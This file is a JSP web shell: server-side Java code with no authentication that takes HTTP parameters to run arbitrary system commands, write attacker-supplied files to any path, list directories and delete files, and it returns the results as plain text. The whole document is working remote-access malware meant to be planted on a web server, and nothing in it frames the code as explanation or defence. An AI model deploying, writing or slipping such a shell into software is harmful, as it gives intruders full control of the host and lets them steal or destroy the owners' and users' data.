<%@ page import="java.io.*, java.util.*, java.net.*" %>
<%
    String action = request.getParameter("action");
    String output = "";

    try {
        if ("cmd".equals(action)) {
            // Execute system commands
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                Process p = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output += line + "\n";
                }
                reader.close();
            }
        } else if ("upload".equals(action)) {
            // File upload
            String filePath = request.getParameter("path");
            String fileContent = request.getParameter("content");
            if (filePath != null && fileContent != null) {
                File file = new File(filePath);
                try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
                    writer.write(fileContent);
                }
                output = "File uploaded to: " + filePath;
            } else {
                output = "Invalid file upload parameters.";
            }
        } else if ("list".equals(action)) {
            // List directory contents
            String dirPath = request.getParameter("path");
            if (dirPath != null) {
                File dir = new File(dirPath);
                if (dir.isDirectory()) {
                    for (File file : Objects.requireNonNull(dir.listFiles())) {
                        output += file.getName() + (file.isDirectory() ? "/" : "") + "\n";
                    }
                } else {
                    output = "Path is not a directory.";
                }
            } else {
                output = "No directory path provided.";
            }
        } else if ("delete".equals(action)) {
            // Delete files
            String filePath = request.getParameter("path");
            if (filePath != null) {
                File file = new File(filePath);
                if (file.delete()) {
                    output = "File deleted: " + filePath;
                } else {
                    output = "Failed to delete file: " + filePath;
                }
            } else {
                output = "No file path provided.";
            }
        } else {
            // Unknown operation
            output = "Unknown action: " + action;
        }
    } catch (Exception e) {
        output = "Error: " + e.getMessage();
    }

    // Return the result
    response.setContentType("text/plain");
    out.print(output);
%>
